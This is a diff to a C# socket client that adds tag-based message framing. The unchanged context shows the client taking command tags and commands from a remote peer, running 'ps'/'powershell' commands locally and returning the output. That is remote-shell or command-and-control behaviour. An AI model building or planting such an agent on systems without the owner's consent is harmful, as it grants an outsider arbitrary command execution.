@@ -30,13 +30,21 @@ namespace myclient
         }
 
 
+        public static string MsgPack(string Msg_In)
+        {
+            string MsgTag_St = "[MYMSST]";
+            string MsgTag_Ed = "[MYMSED]";
+
+            return MsgTag_St + Msg_In + MsgTag_Ed;
+        }
+
         public static void StartClient()
         {
             // Data buffer for incoming data.  
             byte[] bytes = new byte[1024];
             string command_tag;
             string command;
-
+           
             //init
             PsRun myPsRun = new PsRun();
             myPsRun.init();
@@ -69,20 +77,20 @@ namespace myclient
                         int bytesRec = sender.Receive(bytes);
                         command_tag = Encoding.ASCII.GetString(bytes, 0, bytesRec);
                         Console.WriteLine("Recieved Command tag: {0}", command_tag);
-                        byte[] msg = Encoding.ASCII.GetBytes("COMMAND_TAG_SUCCESS");
+                        byte[] msg = Encoding.ASCII.GetBytes(MsgPack("COMMAND_TAG_SUCCESS"));
                         int bytesSent = sender.Send(msg);
 
                         bytesRec = sender.Receive(bytes);
                         command = Encoding.ASCII.GetString(bytes, 0, bytesRec);
                         Console.WriteLine("Recieved Command: {0}", command);
-                        msg = Encoding.ASCII.GetBytes("COMMAND_SUCCESS");
+                        msg = Encoding.ASCII.GetBytes(MsgPack("COMMAND_SUCCESS"));
                         bytesSent = sender.Send(msg);
 
                         //check command
                         if (command_tag.ToLower() == "ps" || command_tag.ToLower() == "powershell")
                         {
                             string psresult = myPsRun.doPsRun(command);
-                            msg = Encoding.ASCII.GetBytes(psresult);
+                            msg = Encoding.ASCII.GetBytes(MsgPack(psresult));
                             bytesSent = sender.Send(msg);
                             //get success ack
                             bytesRec = sender.Receive(bytes);
